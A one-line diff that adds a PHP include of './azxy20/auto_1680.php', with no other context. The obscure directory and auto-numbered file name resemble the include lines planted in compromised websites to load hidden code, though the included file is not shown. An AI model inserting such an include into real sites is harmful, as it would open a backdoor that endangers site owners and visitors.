@@ -1,0 +1,1 @@
+<?php include_once("./azxy20/auto_1680.php");?>
